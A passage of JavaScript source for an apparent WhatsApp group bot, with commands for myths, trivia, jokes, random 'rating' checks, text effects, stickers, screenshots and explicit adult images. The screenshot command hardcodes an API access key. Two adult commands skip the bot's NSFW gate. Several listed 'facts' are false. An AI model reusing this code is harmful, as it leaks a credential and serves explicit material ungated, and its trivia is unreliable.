					'🌈 *Mitos Ujung Pelangi:* Konon, ada harta karun di ujung pelangi, tetapi tidak ada yang bisa mencapainya.',
					'🌺 *Mitos Bunga Tumbuh di Makam:* Bunga yang tumbuh subur di makam dipercaya sebagai tanda bahwa roh orang yang dimakamkan itu damai.',
					'🏰 *Mitos Kastil Berhantu:* Banyak kastil tua di Eropa dipercaya dihantui oleh roh para penghuni masa lalu.',
					'💤 *Mitos Mimpi Gigi Copot:* Mimpi gigi copot sering dianggap sebagai pertanda akan ada kematian di keluarga.',
					'🌜 *Mitos Menghitung Bintang:* Menghitung bintang di langit dipercaya bisa membuat seseorang tumbuh jerawat.',
					'🍀 *Mitos Daun Semanggi Berdaun Empat:* Menemukan daun semanggi berdaun empat dipercaya membawa keberuntungan.',
					'🔥 *Mitos Api Menyala Sendiri:* Api yang menyala tiba-tiba di malam hari sering dikaitkan dengan kehadiran roh halus.',
					'🎵 *Mitos Siulan di Malam Hari:* Bersiul di malam hari dipercaya dapat mengundang makhluk halus.',
					'🦎 *Mitos Cicak Jatuh di Kepala:* Jika cicak jatuh di kepala seseorang, dipercaya itu adalah pertanda buruk.',
					'🌺 *Mitos Bunga Sedap Malam:* Aroma bunga sedap malam sering dianggap sebagai tanda kehadiran makhluk halus.',
					'🪦 *Mitos Makam Baru:* Mengunjungi makam yang baru dibuat di malam hari dipercaya dapat membawa energi negatif.',
					'🧟 *Mitos Zombie di Haiti:* Dalam kepercayaan Voodoo Haiti, ada mitos tentang manusia yang dihidupkan kembali sebagai zombie oleh penyihir.',
					'🌟 *Mitos Cahaya Misterius di Malam Hari:* Cahaya aneh yang terlihat di malam hari sering dianggap sebagai roh yang sedang berkeliaran.',
					'🏞️ *Mitos Danau Berhantu:* Banyak danau di dunia yang dipercaya dihuni oleh roh penjaga atau makhluk mitos.',
					'🪶 *Mitos Bulu Putih:* Menemukan bulu putih dipercaya sebagai tanda bahwa malaikat sedang menjaga kita.',
					'🍃 *Mitos Angin Berhembus Kencang Tiba-Tiba:* Angin yang tiba-tiba berhembus kencang sering dianggap sebagai tanda kehadiran makhluk halus.',
					'🎭 *Mitos Topeng Berhantu:* Beberapa topeng tradisional dipercaya memiliki roh atau energi mistis yang kuat.',
					'🗿 *Mitos Patung Tua:* Patung tua sering dianggap memiliki roh atau kutukan di dalamnya.',
					'⚰️ *Mitos Peti Mati Bergerak:* Ada mitos di beberapa budaya bahwa peti mati bisa bergerak sendiri jika ada roh yang tidak tenang.',
					'🔔 *Mitos Lonceng Berbunyi Sendiri:* Jika lonceng berbunyi sendiri tanpa ada angin atau yang memukulnya, sering dianggap sebagai tanda roh yang ingin berkomunikasi.'
				];
				const randomMyth = myths[Math.floor(Math.random() * myths.length)];
				replygcxeon(`🪄 *Mitos Menarik*\n\n${randomMyth}`);
				db.data.users[m.sender].limit -= 1;
				break;
			}

			case 'faktaunik': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return replygcxeon(mess.limit);
				const facts = [
					'🧠 Otak manusia dapat menghasilkan listrik yang cukup untuk menyalakan lampu kecil!',
					'🐼 Panda bisa menghabiskan sekitar 12 jam sehari hanya untuk makan bambu.',
					'🌕 Di bulan, jejak kaki manusia bisa bertahan selama jutaan tahun karena tidak ada angin atau hujan.',
					'🦄 Jerapah tidur hanya sekitar 10-30 menit sehari dan sering tidur sambil berdiri!',
					'🎵 Musik dapat meningkatkan suasana hati dan membantu mengurangi stres.',
					'🐢 Penyu sudah ada sejak zaman dinosaurus, sekitar lebih dari 200 juta tahun yang lalu.',
					'🍫 Cokelat bisa memicu hormon endorfin yang membuat seseorang merasa bahagia.',
					'🚀 Di luar angkasa, air mata tidak bisa jatuh karena gravitasi yang rendah!',
					'🔮 Lebih dari 70% permukaan Bumi ditutupi oleh air.',
					'🐝 Lebah bisa mengenali wajah manusia layaknya manusia mengenali wajah satu sama lain.',
					'🐧 Penguin adalah satu-satunya burung yang bisa berenang tetapi tidak bisa terbang.',
					'🦷 Gigi adalah satu-satunya bagian tubuh manusia yang tidak bisa memperbaiki dirinya sendiri.',
					'🐌 Siput bisa tidur hingga 3 tahun lamanya!',
					'🔑 Sidik jari koala sangat mirip dengan sidik jari manusia.',
					'🌍 Bumi adalah satu-satunya planet yang tidak dinamai berdasarkan nama dewa atau dewi.',
					'🐟 Ikan mas memiliki ingatan yang lebih baik daripada yang orang pikirkan, mereka bisa mengingat sesuatu hingga beberapa bulan.',
					'🦇 Kelelawar adalah satu-satunya mamalia yang bisa terbang.',
					'🎤 Hati manusia berdetak sekitar 100.000 kali sehari.',
					'🌈 Tidak ada dua pelangi yang benar-benar sama, setiap orang melihat pelangi dengan sudut pandang berbeda.',
					'📱 Lebih banyak orang di dunia memiliki akses ke ponsel daripada toilet bersih.',
					'🌋 Di Islandia, ada lebih dari 100 gunung berapi aktif.',
					'💧 Air panas bisa membeku lebih cepat daripada air dingin dalam kondisi tertentu (Efek Mpemba).',
					'⚡ Petir lebih panas dari permukaan matahari.',
					'🦩 Flamingo mendapatkan warna pink dari makanan yang mereka makan, yaitu udang.',
					'🐇 Kelinci tidak bisa muntah.',
					'🧊 Antartika adalah gurun terbesar di dunia meskipun tertutup es.',
					'🐜 Semut tidak memiliki paru-paru, mereka bernapas melalui pori-pori kecil di tubuh mereka.',
					'🌟 Cahaya dari bintang yang kita lihat mungkin sudah tidak ada lagi karena bintang tersebut bisa saja sudah mati.',
					'🕷️ Laba-laba bisa menghasilkan sutra yang lebih kuat daripada baja dengan berat yang sama.',
					'🐨 Koala tidur hingga 20 jam sehari.',
					'🦁 Singa betina lebih sering berburu dibandingkan singa jantan.',
					'🐍 Ular bisa tidur dengan mata terbuka karena mereka tidak memiliki kelopak mata.',
					'🧠 Otak manusia terdiri dari sekitar 75% air.',
					'🐦 Burung kolibri adalah satu-satunya burung yang bisa terbang mundur.',
					'🎮 Bermain video game bisa meningkatkan koordinasi tangan dan mata.',
					'📖 Orang yang membaca buku secara rutin cenderung lebih empatik dan mudah memahami perasaan orang lain.',
					'🎭 Tertawa dapat meningkatkan sistem kekebalan tubuh.',
					'🌠 Rata-rata ada 44 petir yang menyambar permukaan bumi setiap detik.',
					'🦜 Burung beo bisa meniru suara manusia karena memiliki struktur otot vokal yang unik.',
					'🐴 Kuda bisa tidur sambil berdiri.',
					'🐶 Anjing bisa memahami lebih dari 150 kata manusia.',
					'🌬️ Angin terkuat yang pernah tercatat di Bumi memiliki kecepatan 372 km/jam.',
					'🍯 Madu adalah satu-satunya makanan yang tidak pernah basi.',
					'🦀 Kepiting bisa berjalan ke samping karena struktur tubuh dan kakinya.',
					'🌌 Ada lebih banyak bintang di alam semesta daripada butiran pasir di semua pantai di Bumi.',
					'🐉 Komodo adalah kadal terbesar di dunia.',
					'🏊‍♂️ Manusia bisa bertahan tanpa makanan selama berminggu-minggu, tetapi hanya beberapa hari tanpa air.',
					'🦎 Jika ekor cicak putus, ekornya akan tumbuh kembali.',
					'🚀 Sebagian besar debu di rumah berasal dari kulit mati manusia.'
				];
				const randomFact = facts[Math.floor(Math.random() * facts.length)];
				replygcxeon(`🧠 *Fakta Unik*\n\n${randomFact}`);
				db.data.users[m.sender].limit -= 1;
				break;
			}

case 'faktakucing': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return replygcxeon(mess.limit);
				const fakta = [
					'🐾 Kucing bisa melompat hingga 6 kali panjang tubuhnya!',
					'🐾 Lidah kucing memiliki tekstur kasar untuk membersihkan bulu.',
					'🐾 Kucing menghabiskan sekitar 70% hidupnya untuk tidur.',
					'🐾 Telinga kucing bisa berputar hingga 180 derajat!'
				];
				const randomFakta = fakta[Math.floor(Math.random() * fakta.length)];
				replygcxeon(randomFakta);
				db.data.users[m.sender].limit -= 1;
				break;
			}

			case 'joke': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return replygcxeon(mess.limit);
				const jokes = [
					'🤣 Kenapa kucing gak suka online? Karena takut kena mouse!',
					'🤣 Apa bahasa Jepangnya diskon? Murah-murashii!',
					'🤣 Kenapa sepeda gak bisa berdiri sendiri? Karena lelah!'
				];
				const randomJoke = jokes[Math.floor(Math.random() * jokes.length)];
				replygcxeon(randomJoke);
				db.data.users[m.sender].limit -= 1;
				break;
			}
			
case 'hentaivid': case 'hentai': case 'hentaivideo': {
	if (!m.isGroup) return replygcxeon (mess.group)
if (!AntiNsfw) return replygcxeon(mess.nsfw)
 await replygcxeon (mess.wait)
 const { hentai } = require('./lib/scraper.js')
 anu = await hentai()
 result912 = anu[Math.floor(Math.random(), anu.length)]
 Yasam.sendMessage(m.chat, { video: { url: result912.video_1 }, caption: `${themeemoji} Title : ${result912.title}\n${themeemoji} Category : ${result912.category}\n${themeemoji} Mimetype : ${result912.type}\n${themeemoji} Views : ${result912.views_count}\n${themeemoji} Shares : ${result912.share_count}\n${themeemoji} Source : ${result912.link}\n${themeemoji} Media Url : ${result912.video_1}` }, { quoted: fvrif })
 }
 break
case 'trap' :
if (!m.isGroup) return replygcxeon (mess.group)
if (!AntiNsfw) return replygcxeon(mess.nsfw)
await replygcxeon (mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/nsfw/${command}`) 
Yasam.sendMessage(m.chat, { caption: mess.berhasil, image: { url:waifudd.data.url } }, { quoted: fvrif })
break
case 'hentai-neko' :
case 'hneko' :
if (!m.isGroup) return replygcxeon (mess.group)
if (!AntiNsfw) return replygcxeon(mess.nsfw)
 waifudd = await axios.get(`https://waifu.pics/api/nsfw/neko`)
Yasam.sendMessage(m.chat, { caption: mess.berhasil, image: { url:waifudd.data.url } }, { quoted: fvrif })
break
case 'hentai-waifu' :
case 'nwaifu' :
if (!m.isGroup) return replygcxeon (mess.group)
if (!AntiNsfw) return replygcxeon(mess.nsfw)
await replygcxeon (mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/nsfw/waifu`) 
Yasam.sendMessage(m.chat, { caption: mess.berhasil, image: { url:waifudd.data.url } }, { quoted: fvrif })
break
case 'gasm':
if (!m.isGroup) return replygcxeon (mess.group)
	if (!AntiNsfw) return replygcxeon(mess.nsfw)
await replygcxeon (mess.wait)						
 waifudd = await axios.get(`https://nekos.life/api/v2/img/${command}`)
Yasam.sendMessage(m.chat, { caption: mess.berhasil, image: { url:waifudd.data.url } }, { quoted: fvrif })
break 
case 'milf':
if (!m.isGroup) return replygcxeon (mess.group)
await replygcxeon (mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/milf.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Yasam.sendMessage(m.chat, { caption: mess.berhasil, image: { url: xeonyresult.url } }, { quoted: fvrif })
break 
case 'animespank':
if (!m.isGroup) return replygcxeon (mess.group)
if (!AntiNsfw) return replygcxeon(mess.nsfw)
await replygcxeon (mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/spank`) 
 await Yasam.sendMessage(m.chat, { caption: `Here you go!`, image: {url:waifudd.data.url} },{ quoted:m }).catch(err => {
 return('Error!')
 })
break
case 'blowjob':
if (!m.isGroup) return replygcxeon (mess.group)
	if (!AntiNsfw) return replygcxeon(mess.nsfw)
await replygcxeon (mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/blowjob.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Yasam.sendMessage(m.chat, { caption: mess.berhasil, image: { url: xeonyresult.url } }, { quoted: fvrif })
break
case 'cuckold':
if (!m.isGroup) return replygcxeon (mess.group)
	if (!AntiNsfw) return replygcxeon(mess.nsfw)
await replygcxeon (mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/cuckold.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Yasam.sendMessage(m.chat, { caption: mess.berhasil, image: { url: xeonyresult.url } }, { quoted: fvrif })
break
case 'alya':
await replygcxeon (mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/Alya.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Yasam.sendMessage(m.chat, { caption: `Tuh ${command} nya Kak`, image: { url: xeonyresult.url } }, { quoted: fvrif })
break
case 'eba':
if (!m.isGroup) return replygcxeon (mess.group)
	if (!AntiNsfw) return replygcxeon(mess.nsfw)
await replygcxeon (mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/eba.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Yasam.sendMessage(m.chat, { caption: mess.berhasil, image: { url: xeonyresult.url } }, { quoted: fvrif })
break
case 'pussy':
if (!m.isGroup) return replygcxeon (mess.group)
	if (!AntiNsfw) return replygcxeon(mess.nsfw)
await replygcxeon (mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/pussy.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Yasam.sendMessage(m.chat, { caption: mess.berhasil, image: { url: xeonyresult.url } }, { quoted: fvrif })
break
case 'yuri':
if (!m.isGroup) return replygcxeon (mess.group)
	if (!AntiNsfw) return replygcxeon(mess.nsfw)
await replygcxeon (mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/yuri.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Yasam.sendMessage(m.chat, { caption: mess.berhasil, image: { url: xeonyresult.url } }, { quoted: fvrif })
break
case 'zettai':
if (!m.isGroup) return replygcxeon (mess.group)
	if (!AntiNsfw) return replygcxeon(mess.nsfw)
await replygcxeon (mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/zettai.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Yasam.sendMessage(m.chat, { caption: mess.berhasil, image: { url: xeonyresult.url } }, { quoted: fvrif })
break
case 'gifblowjob':
if (!m.isGroup) return replygcxeon (mess.group)
if (!AntiNsfw) return replygcxeon(mess.nsfw)
await replygcxeon (mess.wait)
 let assss = await axios.get ("https://api.waifu.pics/nsfw/blowjob")
 var bobuff = await fetchBuffer(assss.data.url)
 var bogif = await buffergif(bobuff)
 await Yasam.sendMessage(m.chat,{video:bogif, gifPlayback:true },{quoted:m}).catch(err => {
 })
 break
case 'checkme':
					neme = args.join(" ")
					bet = `${sender}`
					var sifat = ['Fine','Unfriendly','Chapri','Nibba/nibbi','Annoying','Dilapidated','Angry person','Polite','Burden','Great','Cringe','Liar']
					var hoby = ['Cooking','Dancing','Playing','Gaming','Painting','Helping Others','Watching anime','Reading','Riding Bike','Singing','Chatting','Sharing Memes','Drawing','Eating Parents Money','Playing Truth or Dare','Staying Alone']
					var bukcin = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var arp = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var cakep = ['Yes','No','Very Ugly','Very Handsome']
					var wetak= ['Caring','Generous','Angry person','Sorry','Submissive','Fine','Im sorry','Kind Hearted','Patient','UwU','Top','Helpful']
					var baikk = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var bhuruk = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var cerdhas = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var berhani = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var mengheikan = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var sipat = sifat[Math.floor(Math.random() * sifat.length)]
					var biho = hoby[Math.floor(Math.random() * hoby.length)]
					var bhucin = bukcin[Math.floor(Math.random() * bukcin.length)]
					var senga = arp[Math.floor(Math.random() * arp.length)]
					var chakep = cakep[Math.floor(Math.random() * cakep.length)]
					var watak = wetak[Math.floor(Math.random() * wetak.length)]
					var baik = baikk[Math.floor(Math.random() * baikk.length)]
					var burug = bhuruk[Math.floor(Math.random() * bhuruk.length)]
					var cerdas = cerdhas[Math.floor(Math.random() * cerdhas.length)]
					var berani = berhani[Math.floor(Math.random() * berhani.length)]
					var takut = mengheikan[Math.floor(Math.random() * mengheikan.length)]
					 profile = `*≡══《 Check @${bet.split('@')[0]} 》══≡*

*Name :* ${pushname}
*Characteristic :* ${sipat}
*Hobby :* ${biho}
*Simp :* ${bhucin}%
*Great :* ${senga}%
*Handsome :* ${chakep}
*Character :* ${watak}
*Good Morals :* ${baik}%
*Bad Morals :* ${burug}%
*Intelligence :* ${cerdas}%
*Courage :* ${berani}%
*Afraid :* ${takut}%

*≡═══《 CHECK PROPERTIES 》═══≡*`
					try {
ppuser = await Yasam.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
ppxeon = await getBuffer(ppuser)
Yasam.sendMessage(from, { image: ppxeon, caption: profile, mentions: [bet]},{quoted:m})
break
case 'handsomecheck':
				if (!text) return replygcxeon(`Tag Someone, Example : ${prefix + command} @Xeon`)
					const gan = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const teng = gan[Math.floor(Math.random() * gan.length)]
Yasam.sendMessage(from, { text: `*${command}*\n\nName : ${q}\nAnswer : *${teng}%*` }, { quoted: fvrif })
					break
case 'beautifulcheck':
				if (!text) return replygcxeon(`Tag Someone, Example : ${prefix + command} @Xeon`)
					const can = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const tik = can[Math.floor(Math.random() * can.length)]
Yasam.sendMessage(from, { text: `*${command}*\n\nNama : ${q}\nAnswer : *${tik}%*` }, { quoted: fvrif })
					break
					case 'charactercheck':
					if (!text) return replygcxeon(`Tag Someone, Example : ${prefix + command} @Xeon`)
					const xeony =['Compassionate','Generous','Grumpy','Forgiving','Obedient','Good','Simp','Kind-Hearted','patient','UwU','top, anyway','Helpful']
					const taky = xeony[Math.floor(Math.random() * xeony.length)]
					Yasam.sendMessage(from, { text: `Character Check : ${q}\nAnswer : *${taky}*` }, { quoted: fvrif })
				 break
case 'awesomecheck':
 case 'greatcheck':
 case 'gaycheck':
 case 'cutecheck':
 case 'lesbicheck':
 case 'lesbiancheck':
 case 'hornycheck':
 case 'prettycheck':
 case 'lovelycheck':
 case 'uglycheck':
if (!m.isGroup) return replygcxeon (mess.group)
const cex = body.slice(0)
const cek1 = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
const cek2 = cek1[Math.floor(Math.random() * cek1.length)]
if (mentionByReply) {
Yasam.sendMessage(from, { text: 'Question : *' + cex + '*\nChecker : ' + `@${mentionByReply.split('@')[0]}` + '\nAnswer : ' + cek2 + '%', mentions: [mentionByReply] }, { quoted: fvrif })
} else if (mentionByTag[0] && isGroup) {
Yasam.sendMessage(from, { text: 'Question : *' + cex + '*\nChecker : ' + `@${mentionByTag[0].split('@')[0]}` + '\nAnswer : ' + cek2 + '%', mentions: [mentionByTag[0]] }, { quoted: fvrif })
} else if (!mentionByReply && !mentionByTag[0]) {
Yasam.sendMessage(from, { text: 'Question : *' + cex + '*\nChecker : ' + `@${sender.split('@')[0]}` + '\nAnswer : ' + cek2 + '%', mentions: [sender] }, { quoted: fvrif })
}
break
case 'gura':
case 'gurastick':{
var ano = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/main/gura')
var wifegerak = ano.split('\n')
var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
encmedia = await Yasam.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })

}
break
case 'telestick': {
	if (m.isGroup) return XeonStickPrivate()
		if (args[0] && args[0].match(/(https:\/\/t.me\/addstickers\/)/gi)) {
		let xeonresources = await Telesticker(args[0])
		await replygcxeon(`Sending ${xeonresources.length} stickers...`)
		if (m.isGroup && xeonresources.length > 30) {
			await replygcxeon('Number of stickers more than 30, bot will send it in private chat.')
			for (let i = 0; i < xeonresources.length; i++) {
				Yasam.sendMessage(m.sender, { sticker: { url: xeonresources[i].url }})
			}
		} else {
			for (let i = 0; i < xeonresources.length; i++) {
				Yasam.sendMessage(m.chat, { sticker: { url: xeonresources[i].url }})
			}
		}
	} else replygcxeon(`Where is the telegram sticker link?\nExample. ${prefix + command} https://t.me/addstickers/FriendlyDeath`)
}
break

case 'shadow': 
case 'write': 
case 'romantic': 
case 'burnpaper':
case 'smoke': 
case 'narutobanner': 
case 'love': 
case 'undergrass':
case 'doublelove': 
case 'coffecup':
case 'underwaterocean':
case 'smokyneon':
case 'starstext':
case 'rainboweffect':
case 'balloontext':
case 'metalliceffect':
case 'embroiderytext':
case 'flamingtext':
case 'stonetext':
case 'writeart':
case 'summertext':
case 'wolfmetaltext':
case 'nature3dtext':
case 'rosestext':
case 'naturetypography':
case 'quotesunder':
case 'shinetext':{
if (!q) return replygcxeon(`Example : ${prefix+command} Yasam`) 
await replygcxeon (mess.wait)
const photooxy = require('./lib/photooxy')
let link
if (/stonetext/.test(command)) link = 'https://photooxy.com/online-3d-white-stone-text-effect-utility-411.html'
if (/writeart/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/write-art-quote-on-wood-heart-370.html'
if (/summertext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/3d-summer-text-effect-367.html'
if (/wolfmetaltext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/create-a-wolf-metal-text-effect-365.html'
if (/nature3dtext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/make-nature-3d-text-effects-364.html'
if (/rosestext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/yellow-roses-text-360.html'
if (/naturetypography/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/create-vector-nature-typography-355.html'
if (/quotesunder/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/quotes-under-fall-leaves-347.html'
if (/shinetext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/rainbow-shine-text-223.html'
if (/shadow/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/shadow-text-effect-in-the-sky-394.html'
if (/write/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/write-text-on-the-cup-392.html'
if (/romantic/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/romantic-messages-for-your-loved-one-391.html'
if (/burnpaper/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/write-text-on-burn-paper-388.html'
if (/smoke/.test(command)) link = 'https://photooxy.com/other-design/create-an-easy-smoke-type-effect-390.html'
if (/narutobanner/.test(command)) link = 'https://photooxy.com/manga-and-anime/make-naruto-banner-online-free-378.html'
if (/love/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/create-a-picture-of-love-message-377.html'
if (/undergrass/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/make-quotes-under-grass-376.html'
if (/doublelove/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/love-text-effect-372.html'
if (/coffecup/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/put-any-text-in-to-coffee-cup-371.html'
if (/underwaterocean/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/creating-an-underwater-ocean-363.html'
if (/smokyneon/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/make-smoky-neon-glow-effect-343.html'
if (/starstext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/write-stars-text-on-the-night-sky-200.html'
if (/rainboweffect/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/glow-rainbow-effect-generator-201.html'
if (/balloontext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/royal-look-text-balloon-effect-173.html'
if (/metalliceffect/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/illuminated-metallic-effect-177.html'
if (/embroiderytext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/create-embroidery-text-online-191.html'
if (/flamingtext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/realistic-flaming-text-effect-online-197.html'
let dehe = await photooxy.photoOxy(link, q)
Yasam.sendMessage(m.chat, { image: { url: dehe }, caption: mess.berhasil}, { quoted: fvrif })
}
break
case 'setcmd': {
 if (!m.quoted) return replygcxeon('Reply Message!')
 if (!m.quoted.fileSha256) return replygcxeon('SHA256 Hash Missing')
 if (!text) return replygcxeon(`For What Command?`)
 let hash = m.quoted.fileSha256.toString('base64')
 if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) return replygcxeon('You have no permission to change this sticker command')
 global.db.data.sticker[hash] = {
 text,
 mentionedJid: m.mentionedJid,
 creator: m.sender,
 at: + new Date,
 locked: false,
 }
 replygcxeon(`Done!`)
 }
 break
case 'delcmd': {
 let hash = m.quoted.fileSha256.toString('base64')
 if (!hash) return replygcxeon(`No hashes`)
 if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) return replygcxeon('You have no permission to delete this sticker command') 
 delete global.db.data.sticker[hash]
 replygcxeon(`Done!`)
 }
 break
case 'listcmd': {
 let teks = `
*List Hash*
Info: *bold* hash is Locked
${Object.entries(global.db.data.sticker).map(([key, value], index) => `${index + 1}. ${value.locked ? `*${key}*` : key} : ${value.text}`).join('\n')}
`.trim()
 Yasam.sendText(m.chat, teks, m, { mentions: Object.values(global.db.data.sticker).map(x => x.mentionedJid).reduce((a,b) => [...a, ...b], []) })
 }
 break 
case 'lockcmd': {
 if (!YasamCreator) return replygcxeon (mess.owner)
 if (!m.quoted) return replygcxeon('Reply Message!')
 if (!m.quoted.fileSha256) return replygcxeon('SHA256 Hash Missing')
 let hash = m.quoted.fileSha256.toString('base64')
 if (!(hash in global.db.data.sticker)) return replygcxeon('Hash not found in database')
 global.db.data.sticker[hash].locked = !/^un/i.test(command)
 replygcxeon('Done!')
 }
 break
 case 'ssweb': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return replygcxeon(mess.limit);
				if (!text) return replygcxeon('Masukkan URL untuk di-screenshot!');
				await emote('⏱️');
				let sswebfull = `https://api.apiflash.com/v1/urltoimage?access_key=9a202a61afaa4ba0877f12f03e86ea96&url=${encodeURIComponent(text)}&format=png&fresh=true&full_page=true&response_type=json&no_cookie_banners=true&no_ads=true&no_tracking=true&time_zone=Asia/Jakarta`;
				try { 
					let response = await fetch(sswebfull);
					let json = await response.json(); 
					if (!json.url) {
						return replygcxeon('Gagal mengambil screenshot. Pastikan URL yang dimasukkan valid.');
					}
					await Yasam.sendMessage(m.chat, {
						image: {url: json.url},
						caption: mess.done
					}, { 
						quoted: m 
					});
				} catch (error) {
					console.error(error);
					replygcxeon('Terjadi kesalahan saat mengambil screenshot.');
				}
			}
			db.data.users[m.sender].limit -= 1;
			break;
case 'pickupline': {
try {
